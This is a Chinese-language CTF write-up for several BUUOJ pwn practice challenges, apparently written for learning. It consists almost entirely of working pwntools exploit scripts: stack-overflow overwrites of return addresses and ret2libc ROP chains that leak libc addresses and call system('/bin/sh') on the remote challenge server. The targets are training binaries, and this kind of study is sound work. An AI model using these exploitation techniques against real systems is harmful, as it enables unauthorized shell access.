## 0x00 test_your_nc
### ans
测试nc  
nc上直接可以得到shell
### exp
```python
from pwn import *
context.log_level = "debug"
io = remote('node3.buuoj.cn','26984')
io.interactive()
```

# 0x01 rip
### ans
gets()函数的简单栈溢出，没有任何保护。  
选择栈溢出覆盖 $rip 为后门函数地址。
### tips
输入地址要使用 p32() ， p64() 函数打包  

远程测试报错
 - timeout: the monitored command dumped core    

由于栈对齐的原因，本次选择修改后门函数的地址 0x401186 --> 0x40118A 。  
不使用后门函数的开始地址，直接使用 system 函数前的地址。

```c
.text:0000000000401186                 public fun             // 不用这里
.text:0000000000401186 fun             proc near
.text:0000000000401186 ; __unwind {
.text:0000000000401186                 push    rbp
.text:0000000000401187                 mov     rbp, rsp
.text:000000000040118A                 lea     rdi, command    ; "/bin/sh"  //用这里
.text:0000000000401191                 call    _system
.text:0000000000401196                 nop
.text:0000000000401197                 pop     rbp
.text:0000000000401198                 retn
.text:0000000000401198 ; } // starts at 401186
```

### exp
```python
from pwn import *
context.log_level = "debug"

# shell = 0x401186
shell = 0x40118A

# io = process('./rip')
io = remote('node3.buuoj.cn','29905')

payload = (0xf + 8) * 'a' + p64(shell)
# io.recv()
io.sendline(payload)
# io.sendlineafter("please input",payload)

io.interactive()
```

## 0x02 warmup_csaw_2016
### ans
和上面一题考点相同  
这次后门函数的地址由程序直接输出。
gets()函数的简单栈溢出，没有任何保护。  
选择栈溢出覆盖 $rip 为后门函数地址。
### exp
```python
from pwn import *
context.log_level = "debug"

shell = 0x400611

# io = process('./warmup_csaw_2016')
io = remote('node3.buuoj.cn','27284')


payload = (0x40 + 8) * 'a' + p64(shell)
# io.recv()
io.sendline(payload)
# io.sendlineafter("please input",payload)

io.interactive()
```

## 0x03 pwn1_sctf_2016
### ans

### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./pwn1_sctf_2016')
io = remote('node3.buuoj.cn','25120')

shell = 0x08048F0D
payload = "I" * 20 + "a" * 4 + p32(shell)

io.sendline(payload)
io.interactive()

```
## 0x04 ciscn_2019_n_1
### ans
### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./ciscn_2019_n_1')
io = remote('node3.buuoj.cn','25138')

v1 = (0x30-4)* 'a'
v2 = 0x41348000
payload = v1 + p64(v2)

io.sendline(payload)
io.interactive()
```
## 0x05 ciscn_2019_c_1
### ans
### exp
```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

# io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','28729')
e = ELF('./ciscn_2019_c_1')

io.sendlineafter("your choice!\n","1")

pop_rdi = 0x400c83
ret_addr = 0x4006b9
puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = 0x58 * 'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols['main'])
io.sendlineafter("to be encrypted\n",payload)

io.recvuntil("Ciphertext\n")
io.recvline()
puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))

success("puts_addr   " + hex(puts_addr))


# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc_base = puts_addr - libc.sym["puts"]
# system_addr = libc_base + libc.sym["system"]
# binsh_addr = libc_base + next(libc.search("/bin/sh"))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

# system_addr = puts_addr - 0x31580
# binsh_addr = puts_addr + 0x1334da

success("system_addr   " + hex(system_addr))
success("binsh_addr   " + hex(binsh_addr))


io.sendlineafter("your choice!\n","1")
# gdb.attach(io)
payload = 0x58 * 'a' + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendlineafter("to be encrypted\n",payload)


io.recvuntil("Ciphertext\n")
io.recvline()
io.sendline('cat flag')
io.recvline()


# io.sendline(payload)
io.close()
```
## 0x06 [OGeek2019]babyrop
### ans
### exp
```python
from pwn import *
context.log_level = "debug"

# io = process('./OGeek2019_babyrop')
io = remote('node3.buuoj.cn','29730')
e = ELF('./OGeek2019_babyrop')

write_plt = e.plt['write']
write_got = e.got['write']
main_addr = 0x8048825

payload = '\x00' + '\xff' * 7
io.sendline(payload)
payload = (0xE7 + 4) * 'a' +  p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x8)
io.sendlineafter("Correct\n",payload)


write_addr=u32(io.recv(4).strip().ljust(4, '\x00'))
success('write_addr: ' + hex(write_addr))

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./OGeek2019_babyrop.so")
libc_base = write_addr - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search("/bin/sh"))

success("system_addr   " + hex(system_addr))
success("binsh_addr   " + hex(binsh_addr))


payload = '\x00' + '\xff' * 7
io.sendline(payload)
payload = (0xE7 + 4)  * 'a' +  p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) 
io.sendlineafter("Correct",payload)


io.interactive()
```